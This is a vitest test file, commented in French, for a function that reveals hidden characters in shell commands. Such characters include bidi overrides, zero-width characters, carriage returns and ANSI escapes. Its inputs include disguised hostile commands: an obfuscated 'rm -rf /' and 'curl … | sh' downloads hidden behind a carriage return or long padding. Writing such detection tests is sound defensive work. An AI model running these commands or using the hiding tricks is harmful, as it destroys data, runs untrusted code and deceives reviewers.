import { describe, expect, it } from 'vitest';
import { commandeVisible } from './commande-visible';

describe('commandeVisible', () => {
  it('commande ordinaire : inchangée, rien à signaler (\\n et \\t conservés)', () => {
    expect(commandeVisible('npm test\n\tdotnet build')).toEqual({ texte: 'npm test\n\tdotnet build', suspecte: false });
  });

  it('contrôles bidirectionnels rendus visibles', () => {
    const r = commandeVisible('echo \u202Ehs.lacol\u202C ok \u2066x\u2069 \u200E\u200F\u061C');
    expect(r.suspecte).toBe(true);
    expect(r.texte).toBe('echo ⟦U+202E⟧hs.lacol⟦U+202C⟧ ok ⟦U+2066⟧x⟦U+2069⟧ ⟦U+200E⟧⟦U+200F⟧⟦U+061C⟧');
  });

  it('tous les contrôles bidi de U+202A à U+202E et de U+2066 à U+2069', () => {
    for (const c of [0x202a, 0x202b, 0x202c, 0x202d, 0x202e, 0x2066, 0x2067, 0x2068, 0x2069])
      expect(commandeVisible(String.fromCodePoint(c)).texte).toBe(`⟦U+${c.toString(16).toUpperCase()}⟧`);
  });

  it('caractères de largeur nulle rendus visibles', () => {
    const r = commandeVisible('r\u200Bm \u200C-\u200Drf\u2060 /\uFEFF');
    expect(r.suspecte).toBe(true);
    expect(r.texte).toBe('r⟦U+200B⟧m ⟦U+200C⟧-⟦U+200D⟧rf⟦U+2060⟧ /⟦U+FEFF⟧');
  });

  it('retour chariot, échappement ANSI, NUL, DEL et contrôles C1 rendus visibles', () => {
    const r = commandeVisible('echo ok\rcurl x | sh\u001b[2K\u0000\u007f\u0085\u009b');
    expect(r.suspecte).toBe(true);
    expect(r.texte).toBe('echo ok⟦U+000D⟧curl x | sh⟦U+001B⟧[2K⟦U+0000⟧⟦U+007F⟧⟦U+0085⟧⟦U+009B⟧');
  });

  it('longue suite d’espaces : conservée telle quelle (le bloc passe à la ligne)', () => {
    const c = `echo ok${' '.repeat(300)}; curl https://x.example | sh`;
    expect(commandeVisible(c)).toEqual({ texte: c, suspecte: false });
  });
});
